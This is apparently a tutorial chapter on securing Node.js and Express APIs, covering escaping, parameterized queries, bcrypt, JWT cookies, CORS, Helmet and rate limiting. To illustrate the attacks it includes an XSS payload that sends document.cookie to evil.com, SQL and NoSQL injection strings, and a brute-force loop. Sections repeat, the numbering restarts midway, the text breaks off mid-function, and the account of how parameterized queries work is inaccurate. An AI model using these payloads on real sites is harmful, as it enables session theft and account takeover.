# Security in Node.js

## Why Security Matters

**You've never been hacked... yet.** But when it happens:
- User passwords stolen → your app is on the news
- Database wiped → weeks of data gone
- Server compromised → hackers use it to attack others

**This chapter teaches you** to think like an attacker, understand what can go wrong, and how to prevent it.

---

## 1. Understanding the Attack Surface

### 1.1 What Can Attackers Control?

**Everything the user sends**:

```
User's Browser                        Your Server
┌─────────────────┐                  ┌──────────────────┐
│                 │                  │                  │
│ Malicious user  │                  │ Your code thinks │
│ can modify:     │    HTTP Request  │ this is safe...  │
│                 │  ─────────────►  │                  │
│ • URL           │                  │ WRONG!           │
│ • Headers       │                  │                  │
│ • Body data     │                  │                  │
│ • Cookies       │                  │                  │
└─────────────────┘                  └──────────────────┘
```

**Example malicious request**:

```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "email": "<script>alert('hacked')</script>",
  "password": "' OR '1'='1",
  "role": "admin"
}
```

**What the attacker is trying**:
- Email: XSS attack (run JavaScript in other users' browsers)
- Password: SQL injection (bypass login)
- Role: Privilege escalation (make themselves admin)

---

## 2. XSS (Cross-Site Scripting)

### 2.1 What is XSS?

**Simple explanation**: Attacker injects JavaScript into your website that runs in other users' browsers.

### 2.2 How XSS Works

**Scenario**: A comment system

```
Step 1: Attacker posts a comment
┌───────────────────────────────────────────────────────────┐
│ POST /api/comments                                        │
│ {                                                         │
│   "text": "<script>                                       │
│              fetch('https://evil.com/steal?cookie=' +     │
│                document.cookie)                           │
│            </script>"                                     │
│ }                                                         │
└───────────────────────────────────────────────────────────┘
                           │
                           ▼
Step 2: Your server saves it to database
┌───────────────────────────────────────────────────────────┐
│ MongoDB                                                   │
│ {                                                         │
│   "text": "<script>fetch('https://evil.com...')</script>" │
│ }                                                         │
└───────────────────────────────────────────────────────────┘
                           │
                           ▼
Step 3: Innocent user visits page
┌───────────────────────────────────────────────────────────┐
│ GET /api/comments                                         │
│                                                           │
│ Server responds with:                                     │
│ [                                                         │
│   { "text": "<script>fetch('evil.com...')</script>" }     │
│ ]                                                         │
└───────────────────────────────────────────────────────────┘
                           │
                           ▼
Step 4: Browser renders the comment
┌───────────────────────────────────────────────────────────┐
│ User's Browser                                            │
│                                                           │
│ innerHTML = comment.text                                  │
│                                                           │
│ <script>fetch('evil.com...')</script>  ← EXECUTES!        │
│                                                           │
│ Result: User's cookies sent to attacker                   │
└───────────────────────────────────────────────────────────┘
```

**What gets stolen**: Session cookies, tokens, personal data.

### 2.3 Preventing XSS

**Strategy 1: Escape HTML**

Convert dangerous characters to safe text:

```
User input:    <script>alert('xss')</script>
After escape:  &lt;script&gt;alert('xss')&lt;/script&gt;
Displayed as:  <script>alert('xss')</script>  (just text, doesn't execute)
```

**Strategy 2: Sanitize (Remove dangerous tags)**

```
User input:    Hello <script>alert('xss')</script> World
After sanitize: Hello  World
```

**Implementation**:

```js
const { body } = require("express-validator");

body("comment")
  .trim()
  .escape()  // Converts < to &lt;, > to &gt;, etc.
```

**What happens**:

```
Before escape:  { "comment": "<script>alert('xss')</script>" }
                             ↓
After escape:   { "comment": "&lt;script&gt;alert('xss')&lt;/script&gt;" }
                             ↓
Stored in DB:   { "comment": "&lt;script&gt;alert('xss')&lt;/script&gt;" }
                             ↓
Sent to browser: "&lt;script&gt;alert('xss')&lt;/script&gt;"
                             ↓
Rendered as:     <script>alert('xss')</script>  (visible text, doesn't run)
```

---

## 3. SQL/NoSQL Injection

### 3.1 What is Injection?

**Simple explanation**: Attacker sends input that changes your database query.

### 3.2 SQL Injection Example (PostgreSQL)

**Your vulnerable code**:

```js
// ❌ NEVER DO THIS
const email = req.body.email;
const query = `SELECT * FROM users WHERE email = '${email}'`;
const result = await pool.query(query);
```

**Normal user login**:

```
User enters: alice@example.com

Query becomes:
SELECT * FROM users WHERE email = 'alice@example.com'

Result: Returns Alice's user record ✓
```

**Attacker's input**:

```
Attacker enters: admin@example.com' OR '1'='1

Query becomes:
SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
                                                          ↑
                                                  Always true!

Result: Returns ALL users (first one is probably admin) ✗
```

**The attack visualized**:

```
Intended query structure:
┌────────────────────────────────────┐
│ SELECT * FROM users                │
│ WHERE email = 'user@example.com'   │
└────────────────────────────────────┘

Attacker breaks the structure:
┌────────────────────────────────────────────────────────┐
│ SELECT * FROM users                                    │
│ WHERE email = 'admin@example.com'  ← closes string     │
│           OR '1'='1'                ← adds condition   │
│                    ↑                                   │
│         This is always true!                           │
└────────────────────────────────────────────────────────┘
```

### 3.3 Preventing SQL Injection

**Use parameterized queries**:

```js
// ✅ SAFE
const email = req.body.email;
const query = "SELECT * FROM users WHERE email = $1";
const result = await pool.query(query, [email]);
```

**What happens behind the scenes**:

```
Your code:        query("SELECT * FROM users WHERE email = $1", [email])
                                                              ↑
                                                    Placeholder

User input:       admin@example.com' OR '1'='1

Database driver:  1. Sees $1 placeholder
                  2. Treats everything in [email] as DATA, not CODE
                  3. Escapes dangerous characters automatically

Final query:      SELECT * FROM users 
                  WHERE email = 'admin@example.com'' OR ''1''=''1'
                                                   ↑↑    ↑↑
                                          Single quotes escaped

Result:           No user found (email doesn't exist) ✓
```

**Key insight**: Database knows `$1` is data, not part of the SQL command.

### 3.4 NoSQL Injection (MongoDB)

**Your vulnerable code**:

```js
// ❌ DANGEROUS
const email = req.body.email;
const user = await User.findOne({ email: email });
```

**Attacker's payload**:

```json
{
  "email": { "$ne": null }
}
```

**What happens**:

```
Your code:     User.findOne({ email: req.body.email })

Attacker sends: { "email": { "$ne": null } }

Query becomes: User.findOne({ email: { "$ne": null } })
                                        ↑
                                "not equal to null"

Result: Returns first user where email is not null = ANY USER ✗
```

### 3.5 Preventing NoSQL Injection

**Strategy 1: Validate input type**

```js
const { body } = require("express-validator");

body("email")
  .isEmail()  // Ensures it's actually an email string
  .trim()
```

**What happens**:

```
Attacker sends: { "email": { "$ne": null } }
                            ↓
Validator checks: Is { "$ne": null } a valid email?
                            ↓
                          NO!
                            ↓
                  Request rejected ✓
```

**Strategy 2: Sanitize MongoDB operators**

```bash
npm install express-mongo-sanitize
```

```js
const mongoSanitize = require("express-mongo-sanitize");

app.use(mongoSanitize());  // Removes $ and . from input
```

**What happens**:

```
Request body:     { "email": { "$ne": null } }
                               ↓
After sanitize:   { "email": { "ne": null } }
                               ↑
                         $ removed

Query becomes:    User.findOne({ email: { "ne": null } })
                                         ↑
                              Not a MongoDB operator!

Result:           No user found (literal object doesn't match) ✓
```

---

## 4. Understanding Validation Flow

### 4.1 Where Validation Happens

```
Client Request                   Your Server
┌──────────────┐                ┌────────────────────────────────┐
│              │                │                                │
│ POST /signup │  ────────────► │ 1. express.json() middleware   │
│              │                │    Parses body                 │
│ {            │                │                                │
│  "email":    │                │ 2. Validator middleware        │
│    "bad",    │                │    Checks: Is email valid?     │
│  "password": │                │            Is password strong? │
│    "123"     │                │                                │
│ }            │                │    ✗ Validation failed         │
│              │                │                                │
│              │ ◄────────────  │ 3. Return 400 error            │
│              │                │    Never reaches controller!   │
└──────────────┘                └────────────────────────────────┘
```

**Middleware order is critical**:

```js
app.use(express.json());           // 1. Parse body first

router.post("/signup",
  signupValidation,                // 2. Then validate
  handleValidationErrors,          // 3. Then check for errors
  authController.signup            // 4. Finally, controller logic
);
```

### 4.2 Validation Example with Data Flow

**File**: `src/middlewares/validators/auth.validator.js`

```js
const { body, validationResult } = require("express-validator");

// ============================================
// VALIDATION RULES
// ============================================

const signupValidation = [
  body("email")
    .isEmail()
    .withMessage("Invalid email format")
    .normalizeEmail()  // Sanitize: convert to lowercase, remove dots from Gmail
    .trim(),
  
  body("password")
    .isLength({ min: 8 })
    .withMessage("Password must be at least 8 characters")
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/)
    .withMessage("Password must contain uppercase, lowercase, and number"),
  
  body("username")
    .trim()
    .isLength({ min: 3, max: 20 })
    .withMessage("Username must be 3-20 characters")
    .matches(/^[a-zA-Z0-9_]+$/)
    .withMessage("Username can only contain letters, numbers, and underscores")
    .escape(),  // Sanitize: convert HTML entities (< becomes &lt;)
];

const loginValidation = [
  body("email")
    .isEmail()
    .withMessage("Invalid email")
    .normalizeEmail()
    .trim(),
  
  body("password")
    .notEmpty()
    .withMessage("Password is required")
];

// ============================================
// VALIDATION ERROR HANDLER
// ============================================

const handleValidationErrors = (req, res, next) => {
  const errors = validationResult(req);
  
  if (!errors.isEmpty()) {
    // Format errors for response
    const formattedErrors = errors.array().map(err => ({
      field: err.path,
      message: err.msg
    }));
    
    return res.status(400).json({
      success: false,
      error: "Validation failed",
      details: formattedErrors
    });
  }
  
  next();
};

module.exports = {
  signupValidation,
  loginValidation,
  handleValidationErrors
};
```

**Data flow**:

```
Request arrives:
{ "email": "BOB@GMAIL.COM", "password": "123" }
           ↓
signupValidation runs:
  - Check email format: ✓ Valid
  - Normalize: BOB@GMAIL.COM → bob@gmail.com
  - Check password length: ✗ Too short (3 < 8)
           ↓
handleValidationErrors runs:
  - errors.isEmpty() = false
  - Return 400 with errors
           ↓
Response:
{
  "success": false,
  "errors": [
    {
      "field": "password",
      "message": "Password must be at least 8 characters"
    }
  ]
}
           ↓
Controller never executes!
```

---

## 5. Password Security

### 5.1 Why Hash Passwords?

**Problem**: Database gets leaked.

**Scenario 1: Storing plain text passwords** ❌

```
Database leak:
┌──────────────────────────────────────┐
│ email             password           │
├──────────────────────────────────────┤
│ alice@email.com   mypassword123      │
│ bob@email.com     securepass456      │
│ charlie@email.com ilovecats789       │
└──────────────────────────────────────┘
        ↓
Attacker gets database
        ↓
Attacker can:
  1. Log in as any user
  2. Try same password on other sites
     (people reuse passwords)
```

**Scenario 2: Hashing passwords** ✓

```
Database leak:
┌──────────────────────────────────────────────────────────┐
│ email             passwordHash                           │
├──────────────────────────────────────────────────────────┤
│ alice@email.com   $2b$10$N9qo8uLOickgx2ZMRZoMy.e1J8b4... │
│ bob@email.com     $2b$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps... │
│ charlie@email.com $2b$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa... │
└──────────────────────────────────────────────────────────┘
        ↓
Attacker gets database
        ↓
Attacker can:
  1. Try to crack hashes (very slow, might take years)
  2. Cannot directly log in
  3. Cannot use on other sites
```

### 5.2 How Hashing Works

**One-way function**: Easy to hash, impossible to reverse.

```
Input:  "mypassword123"
          ↓
bcrypt.hash()
          ↓
Output: "$2b$10$N9qo8uLOickgx2ZMRZoMy.e1J8b4..."

You CANNOT go backwards:
"$2b$10$N9qo8..." → ??? (unknown)
```

**How login works then?**

```
User login attempt:
┌────────────────────────────────────────────────────────┐
│ 1. User enters password: "mypassword123"               │
│                                                        │
│ 2. Fetch stored hash from DB:                          │
│    "$2b$10$N9qo8uLOickgx2ZMRZoMy.e1J8b4..."            │
│                                                        │
│ 3. Compare:                                            │
│    bcrypt.compare("mypassword123", stored_hash)        │
│                         ↓                              │
│    Hash input password with same salt                  │
│                         ↓                              │
│    Compare results                                     │
│                         ↓                              │
│    Match? → Login successful ✓                         │
│    No match? → Login failed ✗                          │
└────────────────────────────────────────────────────────┘
```

### 5.3 Implementation

```js
const bcrypt = require("bcrypt");

// ============================================
// SIGNUP: Hash password before saving
// ============================================
const plainPassword = "mypassword123";

const salt = await bcrypt.genSalt(10);
// salt = random string to make hash unique
// 10 = cost factor (higher = more secure but slower)

const hash = await bcrypt.hash(plainPassword, salt);
// hash = "$2b$10$N9qo8uLOickgx2ZMRZoMy.e1J8b4..."

await User.create({
  email: "alice@example.com",
  passwordHash: hash  // Store hash, NOT plain password
});

// ============================================
// LOGIN: Compare passwords
// ============================================
const enteredPassword = "mypassword123";
const user = await User.findOne({ email: "alice@example.com" });

const isValid = await bcrypt.compare(enteredPassword, user.passwordHash);

if (isValid) {
  // Passwords match - log in
} else {
  // Wrong password
}
```

**What bcrypt.compare does internally**:

```
Step 1: Extract salt from stored hash
  "$2b$10$N9qo8uLOickgx2ZMRZoMy.e1J8b4..."
          ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
          This part is the salt

Step 2: Hash entered password with same salt
  bcrypt.hash("mypassword123", extracted_salt)
  = "$2b$10$N9qo8uLOickgx2ZMRZoMy.e1J8b4..."

Step 3: Compare
  New hash === Stored hash?
  "$2b$10$N9qo8uLOickgx2ZMRZoMy.e1J8b4..." === "$2b$10$N9qo8uLOickgx2ZMRZoMy.e1J8b4..."
  
  Yes → Password correct ✓
```

---

## 6. JWT Security

### 6.1 Understanding JWT Structure

**What is a JWT?**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InVzZXIxMjMiLCJlbWFpbCI6ImFsaWNlQGV4YW1wbGUuY29tIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

This is actually 3 parts separated by dots (.):
```

**Breaking it down**:

```
Part 1: Header (Algorithm & Type)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
        ↓ base64 decode
{ "alg": "HS256", "typ": "JWT" }

Part 2: Payload (Your data)
eyJpZCI6InVzZXIxMjMiLCJlbWFpbCI6ImFsaWNlQGV4YW1wbGUuY29tIiwiaWF0IjoxNTE2MjM5MDIyfQ
        ↓ base64 decode
{
  "id": "user123",
  "email": "alice@example.com",
  "iat": 1516239022
}

Part 3: Signature (Verification)
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
        ↓
Hash of (header + payload + secret)
```

**IMPORTANT**: Anyone can decode parts 1 & 2 (they're just base64, not encrypted).

```
Attacker can see:
✓ User ID
✓ Email
✓ Expiration time
✗ CANNOT modify without invalidating signature
```

### 6.2 How JWT Verification Works

```
Step 1: Client sends JWT
┌──────────────────────────────────────────────────────────┐
│ GET /api/profile                                         │
│ Authorization: Bearer eyJhbGci...                        │
└──────────────────────────────────────────────────────────┘
                     ↓
Step 2: Server extracts and splits JWT
┌──────────────────────────────────────────────────────────┐
│ header  = eyJhbGci...                                    │
│ payload = eyJpZCI...                                     │
│ signature = SflKxw...                                    │
└──────────────────────────────────────────────────────────┘
                     ↓
Step 3: Server recreates signature
┌──────────────────────────────────────────────────────────┐
│ newSignature = HMAC_SHA256(                              │
│   header + "." + payload,                                │
│   YOUR_SECRET_KEY                                        │
│ )                                                        │
└──────────────────────────────────────────────────────────┘
                     ↓
Step 4: Compare signatures
┌──────────────────────────────────────────────────────────┐
│ newSignature === signature from JWT?                     │
│                                                          │
│ YES → Token valid, decode payload, use data ✓            │
│ NO  → Token tampered with, reject request ✗              │
└──────────────────────────────────────────────────────────┘
```

**Why attacker can't modify JWT**:

```
Attacker tries to change payload:
Original: { "id": "user123", "role": "user" }
Modified: { "id": "user123", "role": "admin" }
                                      ↑
                              Changed this

Creates new JWT:
header.newPayload.oldSignature
              ↓
Server recreates signature with newPayload:
newSignature = HMAC(header + newPayload, secret)
              ↓
newSignature ≠ oldSignature
              ↓
JWT rejected ✗
```

### 6.3 Where to Store JWT?

**Option 1: localStorage** ❌

```
Browser
┌──────────────────────────────────────┐
│ localStorage.setItem("token", jwt)   │
│                                      │
│ Any JavaScript can read this!        │
│ <script>                             │
│   const token = localStorage.token;  │
│   sendToAttacker(token);             │
│ </script>                            │
└──────────────────────────────────────┘

Vulnerable to: XSS attacks
```

**Option 2: Regular cookie** ❌

```
Browser
┌──────────────────────────────────────┐
│ document.cookie = "token=..."        │
│                                      │
│ JavaScript can still read!           │
│ <script>                             │
│   const token = document.cookie;     │
│   sendToAttacker(token);             │
│ </script>                            │
└──────────────────────────────────────┘

Vulnerable to: XSS attacks
```

**Option 3: HTTP-only cookie** ✓

```
Server sets cookie:
res.cookie("token", jwt, {
  httpOnly: true,    ← JavaScript CANNOT access
  secure: true,      ← HTTPS only
  sameSite: "strict" ← CSRF protection
});

Browser
┌──────────────────────────────────────┐
│ Cookie stored by browser             │
│                                      │
│ <script>                             │
│   const token = document.cookie;     │
│   // Returns: "" (empty!)            │
│ </script>                            │
│                                      │
│ Cookie automatically sent with       │
│ requests, but JavaScript can't read  │
└──────────────────────────────────────┘

Protected from: XSS attacks
```

**How it works**:

```
Login successful:
Server → Browser: Set-Cookie: token=eyJhbGci...; HttpOnly; Secure
                                                   ↑         ↑
                                    JS can't access    HTTPS only

Future requests:
Browser → Server: Cookie: token=eyJhbGci...
                  ↑
           Browser automatically includes
           (developer doesn't need to manually add)
```

---

## 7. CORS (Cross-Origin Resource Sharing)

### 7.1 Understanding Same-Origin Policy

**The browser's default security**:

```
Your API:     https://api.myapp.com
Your Website: https://myapp.com

Frontend makes request:
┌──────────────────────────────────────────┐
│ fetch("https://api.myapp.com/users")     │
└──────────────────────────────────────────┘
        ↓
Browser checks:
  Frontend origin: https://myapp.com
  API origin:      https://api.myapp.com
                   ↑
              Different domains!
        ↓
Browser: "Cross-origin request detected!"
         "Blocked by default for security"
```

**What counts as "different origin"**:

```
Same origin:
https://api.myapp.com/users
https://api.myapp.com/posts
         ↑
    Same domain ✓

Different origins:
https://api.myapp.com    ← Different domain ✗
https://myapp.com

https://api.myapp.com    ← Different subdomain ✗
https://admin.api.myapp.com

https://api.myapp.com    ← Different protocol ✗
http://api.myapp.com

https://api.myapp.com    ← Different port ✗
https://api.myapp.com:8080
```

### 7.2 How CORS Works

```
Step 1: Browser sends preflight request
┌──────────────────────────────────────────────────┐
│ OPTIONS /api/users HTTP/1.1                      │
│ Origin: https://myapp.com                        │
│ Access-Control-Request-Method: POST              │
└──────────────────────────────────────────────────┘
        ↓
Step 2: Server responds with CORS headers
┌─────────────────────────────────────────────────┐
│ HTTP/1.1 200 OK                                 │
│ Access-Control-Allow-Origin: https://myapp.com  │
│ Access-Control-Allow-Methods: GET, POST, PUT    │
│ Access-Control-Allow-Headers: Content-Type      │
└─────────────────────────────────────────────────┘
        ↓
Step 3: Browser checks if origin is allowed
┌─────────────────────────────────────────────────┐
│ Is "https://myapp.com" in Allow-Origin?         │
│   YES → Allow request ✓                         │
│   NO  → Block request ✗                         │
└─────────────────────────────────────────────────┘
```

### 7.3 CORS Configuration

**Development (allow all)**:

```js
const cors = require("cors");

app.use(cors());  // Allows ALL origins
```

**Production (specific origins only)**:

```js
const corsOptions = {
  origin: function (origin, callback) {
    const allowedOrigins = [
      "https://myapp.com",
      "https://www.myapp.com"
    ];
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true);  // Allow
    } else {
      callback(new Error("Not allowed by CORS"));  // Block
    }
  },
  credentials: true  // Allow cookies
};

app.use(cors(corsOptions));
```

**What happens**:

```
Request from https://myapp.com:
  origin in allowedOrigins? YES
  → Add header: Access-Control-Allow-Origin: https://myapp.com
  → Browser allows request ✓

Request from https://evil.com:
  origin in allowedOrigins? NO
  → Don't add CORS headers
  → Browser blocks request ✗
```

---

## 8. Helmet.js - Security Headers

### 8.1 What Are Security Headers?

**Headers tell browsers how to behave**:

```
Response without security headers:
HTTP/1.1 200 OK
Content-Type: application/json

{ "data": "..." }

Browser thinks:
"No special instructions, I'll do whatever the page says"
```

```
Response with security headers:
HTTP/1.1 200 OK
Content-Type: application/json
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000

{ "data": "..." }

Browser thinks:
"Server says:
 - Don't allow this page in iframes (prevents clickjacking)
 - Don't guess content types (prevents MIME sniffing attacks)
 - Always use HTTPS for the next year"
```

### 8.2 What Helmet Does

```js
const helmet = require("helmet");

app.use(helmet());  // Adds multiple security headers automatically
```

**Headers added**:

```
X-Frame-Options: SAMEORIGIN
  → Prevents clickjacking (embedding your site in iframes)

X-Content-Type-Options: nosniff
  → Prevents MIME sniffing attacks

Strict-Transport-Security: max-age=31536000
  → Forces HTTPS for 1 year

X-DNS-Prefetch-Control: off
  → Prevents DNS prefetch (privacy)
```

---

## 9. Rate Limiting

### 9.1 Why Rate Limit?

**Without rate limiting**:

```
Attacker's script:
for (let i = 0; i < 1000000; i++) {
  fetch("https://api.myapp.com/login", {
    method: "POST",
    body: JSON.stringify({
      email: "admin@myapp.com",
      password: guessPassword(i)
    })
  });
}

Result:
- 1 million login attempts
- Server crashes
- Might guess password
```

**With rate limiting**:

```
First 5 requests: ✓ Allowed
6th request: ✗ Blocked

Response:
{
  "error": "Too many attempts",
  "retryAfter": 900  // seconds
}
```

### 9.2 How Rate Limiting Works

```
Request arrives
     ↓
Check: How many requests from this IP in last 15 minutes?
     ↓
     ├─ < 100 requests → Allow ✓
     │                   Increment counter
     │
     └─ ≥ 100 requests → Block ✗
                         Return 429 error
```

**Data stored** (in memory or Redis):

```
{
  "192.168.1.1": {
    "count": 5,
    "resetTime": 1699564800  // Unix timestamp
  },
  "192.168.1.2": {
    "count": 102,
    "resetTime": 1699564800
  }
}
```

### 9.3. Implementation
3. 
**Setup***
```bash
npm install express-rate-limit
```

**Middleware**
```js
const rateLimit = require("express-rate-limit");

// ============================================
// GENERAL API RATE LIMIT
// ============================================
// Apply to all API routes
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                   // Max 100 requests per window
  message: {
    success: false,
    error: "Too many requests, please try again later"
  },
  standardHeaders: true,  // Return rate limit info in headers
  legacyHeaders: false
});

// ============================================
// STRICT RATE LIMIT
// ============================================
// For sensitive endpoints (login, signup)
const strictLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,                     // Max 5 requests per window
  message: {
    success: false,
    error: "Too many attempts, please try again after 15 minutes"
  }
});

// ============================================
// CREATE ACCOUNT RATE LIMIT
// ============================================
// Prevent automated account creation
const createAccountLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,  // 1 hour
  max: 3,                     // Max 3 accounts per IP per hour
  message: {
    success: false,
    error: "Too many accounts created from this IP"
  }
});

module.exports = {
  generalLimiter,
  strictLimiter,
  createAccountLimiter
};
```

**Apply Rate Limiting to Server**
```js
const express = require("express");
const { generalLimiter } = require("./middlewares/rateLimiter");

const app = express();

// Apply to all /api routes
app.use("/api", generalLimiter);

// Your routes...
module.exports = app;
```

**Client's Side**
When rate limited, the response includes headers:

```
X-RateLimit-Limit: 100          # Max requests allowed
X-RateLimit-Remaining: 95       # Requests left
X-RateLimit-Reset: 1642345678   # When limit resets (Unix timestamp)
```

**Client can check these** before making requests.

---



### 1.3 Using Validators

**File**: `src/routes/auth.routes.js`

```js
const express = require("express");
const authController = require("../controllers/auth.controller");
const { 
  signupValidation, 
  loginValidation, 
  handleValidationErrors 
} = require("../middlewares/validators/auth.validator");

const router = express.Router();

// Apply validation middleware before controller
router.post("/signup", 
  signupValidation,           // 1. Validate & sanitize
  handleValidationErrors,     // 2. Check for errors
  authController.signup       // 3. Controller logic
);

router.post("/login", 
  loginValidation,
  handleValidationErrors,
  authController.login
);

module.exports = router;
```

### 1.4 Common Validation Patterns

```js
const { body, param, query } = require("express-validator");

// ============================================
// EMAIL VALIDATION
// ============================================
body("email")
  .isEmail()
  .normalizeEmail()
  .trim()

// ============================================
// PASSWORD VALIDATION
// ============================================
body("password")
  .isLength({ min: 8, max: 100 })
  .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
  .withMessage("Password must contain uppercase, lowercase, number, and special character")

// ============================================
// URL VALIDATION
// ============================================
body("website")
  .optional()
  .isURL()
  .trim()

// ============================================
// PHONE NUMBER VALIDATION
// ============================================
body("phone")
  .isMobilePhone()
  .withMessage("Invalid phone number")

// ============================================
// DATE VALIDATION
// ============================================
body("birthdate")
  .isISO8601()
  .toDate()

// ============================================
// NUMERIC VALIDATION
// ============================================
body("age")
  .isInt({ min: 18, max: 120 })
  .toInt()

body("price")
  .isFloat({ min: 0 })
  .toFloat()

// ============================================
// ARRAY VALIDATION
// ============================================
body("tags")
  .isArray({ min: 1, max: 5 })
  .withMessage("Tags must be an array with 1-5 items")

body("tags.*")  // Validate each item in array
  .trim()
  .isLength({ min: 2, max: 20 })

// ============================================
// ENUM VALIDATION
// ============================================
body("role")
  .isIn(["user", "admin", "moderator"])
  .withMessage("Invalid role")

// ============================================
// CUSTOM VALIDATION
// ============================================
body("confirmPassword")
  .custom((value, { req }) => {
    if (value !== req.body.password) {
      throw new Error("Passwords do not match");
    }
    return true;
  })

// ============================================
// URL PARAMETER VALIDATION
// ============================================
param("id")
  .isMongoId()
  .withMessage("Invalid ID format")

// ============================================
// QUERY STRING VALIDATION
// ============================================
query("page")
  .optional()
  .isInt({ min: 1 })
  .toInt()

query("limit")
  .optional()
  .isInt({ min: 1, max: 100 })
  .toInt()
```

### 1.5 XSS Prevention

**Problem**: User inputs `<script>alert('hacked')</script>` and it executes.

**Solution**: Sanitize HTML content.

```bash
npm install xss
```

```js
const xss = require("xss");

// Sanitize HTML input
const cleanHTML = xss(userInput);
// <script>alert('hacked')</script> becomes &lt;script&gt;alert('hacked')&lt;/script&gt;

// In validator
body("bio")
  .trim()
  .customSanitizer(value => xss(value))
```

**Better approach**: Don't allow HTML at all unless necessary.

```js
body("bio")
  .trim()
  .escape()  // Converts all HTML to entities
```

---

## 2. Helmet.js - Security Headers

**Problem**: Browsers need to be told how to behave securely.

**Solution**: Set security-related HTTP headers.

### 2.1 Installation

```bash
npm install helmet
```

### 2.2 Basic Setup

**File**: `src/app.js`

```js
const express = require("express");
const helmet = require("helmet");

const app = express();

// ============================================
// HELMET MIDDLEWARE
// ============================================
// Apply before other middleware
app.use(helmet());

// Your other middleware...
app.use(express.json());

module.exports = app;
```

### 2.3 What Helmet Does

Helmet sets these headers automatically:

```
X-DNS-Prefetch-Control: off
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
```

**What each header does**:

| Header | Purpose |
|--------|---------|
| `X-Frame-Options` | Prevents clickjacking (your site in iframe) |
| `X-Content-Type-Options` | Prevents MIME sniffing attacks |
| `Strict-Transport-Security` | Forces HTTPS |
| `X-XSS-Protection` | Blocks reflected XSS (older browsers) |

### 2.4 Custom Configuration

```js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
    }
  },
  hsts: {
    maxAge: 31536000,  // 1 year
    includeSubDomains: true,
    preload: true
  }
}));
```

---

## 3. CORS Configuration

**Problem**: By default, browsers block requests from different origins.

**Solution**: Configure CORS properly.

### 3.1 Basic Setup

```bash
npm install cors
```

```js
const cors = require("cors");

// ============================================
// ALLOW ALL ORIGINS (Development Only)
// ============================================
app.use(cors());
```

### 3.2 Production Configuration

**File**: `src/config/cors.js`

```js
const cors = require("cors");

const corsOptions = {
  // ============================================
  // ALLOWED ORIGINS
  // ============================================
  origin: function (origin, callback) {
    const allowedOrigins = [
      "https://myapp.com",
      "https://www.myapp.com",
      "https://admin.myapp.com"
    ];
    
    // Allow requests with no origin (mobile apps, Postman)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  
  // ============================================
  // ALLOWED METHODS
  // ============================================
  methods: ["GET", "POST", "PUT", "PATCH", "DELETE"],
  
  // ============================================
  // ALLOWED HEADERS
  // ============================================
  allowedHeaders: [
    "Content-Type",
    "Authorization",
    "X-Requested-With"
  ],
  
  // ============================================
  // ALLOW CREDENTIALS (cookies, auth headers)
  // ============================================
  credentials: true,
  
  // ============================================
  // CACHE PREFLIGHT RESPONSE
  // ============================================
  maxAge: 86400  // 24 hours
};

module.exports = corsOptions;
```

**File**: `src/app.js`

```js
const cors = require("cors");
const corsOptions = require("./config/cors");

app.use(cors(corsOptions));
```

### 3.3 Environment-Based CORS

```js
// File: src/config/cors.js

const allowedOrigins = process.env.NODE_ENV === "production"
  ? [
      "https://myapp.com",
      "https://www.myapp.com"
    ]
  : [
      "http://localhost:3000",
      "http://localhost:5173"
    ];

const corsOptions = {
  origin: function (origin, callback) {
    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  credentials: true
};

module.exports = corsOptions;
```

---

## 4. Password Security

### 4.1 Hashing Passwords

**NEVER store plain text passwords.**

```bash
npm install bcrypt
```

**File**: `src/models/User.model.js`

```js
const mongoose = require("mongoose");
const bcrypt = require("bcrypt");

const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  passwordHash: { type: String, required: true }
});

// ============================================
// HASH PASSWORD BEFORE SAVING
// ============================================
userSchema.pre("save", async function(next) {
  // Only hash if password is modified
  if (!this.isModified("passwordHash")) return next();
  
  // Generate salt and hash
  const salt = await bcrypt.genSalt(10);
  this.passwordHash = await bcrypt.hash(this.passwordHash, salt);
  
  next();
});

// ============================================
// COMPARE PASSWORD METHOD
// ============================================
userSchema.methods.comparePassword = async function(candidatePassword) {
  return await bcrypt.compare(candidatePassword, this.passwordHash);
};

module.exports = mongoose.model("User", userSchema);
```

**Usage**:

```js
// Creating user
const user = await User.create({
  email: "alice@example.com",
  passwordHash: "plainPassword123"  // Will be hashed automatically
});

// Login
const user = await User.findOne({ email });
const isValid = await user.comparePassword(enteredPassword);

if (!isValid) {
  return res.status(401).json({ error: "Invalid credentials" });
}
```

### 4.2 Password Reset Flow

```js
const crypto = require("crypto");

// ============================================
// GENERATE RESET TOKEN
// ============================================
userSchema.methods.createPasswordResetToken = function() {
  // Generate random token
  const resetToken = crypto.randomBytes(32).toString("hex");
  
  // Hash token before storing (don't store plain token)
  this.passwordResetToken = crypto
    .createHash("sha256")
    .update(resetToken)
    .digest("hex");
  
